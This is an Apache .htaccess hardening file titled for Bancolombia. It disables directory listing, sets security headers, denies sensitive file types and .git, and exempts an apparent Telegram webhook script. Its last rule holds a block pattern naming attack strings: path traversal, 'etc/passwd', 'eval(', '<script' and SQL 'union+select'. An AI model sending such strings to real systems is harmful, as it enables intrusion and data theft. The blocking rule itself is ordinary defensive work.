# ══════════════════════════════════════════════════════════
# .htaccess Principal — Seguridad Bancolombia (4c7a1d9e)
# ══════════════════════════════════════════════════════════

# ── Desactivar listado de directorios ────────────────────
Options -Indexes

# ── Headers de seguridad ──────────────────────────────────
<IfModule mod_headers.c>
    Header unset X-Powered-By
    Header always unset X-Powered-By
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "no-referrer"
</IfModule>

# ── Bloquear acceso directo a archivos sensibles ─────────
<FilesMatch "\.(json|env|log|sql|bak|sh|git|md|lock|yml|yaml|ini|conf)$">
    <IfModule mod_authz_core.c>
        Require all denied
    </IfModule>
    <IfModule !mod_authz_core.c>
        Order Allow,Deny
        Deny from all
    </IfModule>
</FilesMatch>

# ── Mod Rewrite Seguro ───────────────────────────────────
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Proteger archivos .htaccess y .git
    RewriteRule ^\.ht - [F,L]
    RewriteRule ^\.git - [F,L]

    # Excepción para el Webhook de Telegram
    RewriteCond %{REQUEST_URI} updatetele\.php [NC]
    RewriteRule ^ - [L]

    # Bloquear exploits comunes en query string
    RewriteCond %{QUERY_STRING} (\.\./|\.\.\\|etc/passwd|wp-admin|phpmyadmin|eval\(|<script|union\+select) [NC]
    RewriteRule ^ - [F,L]
</IfModule>
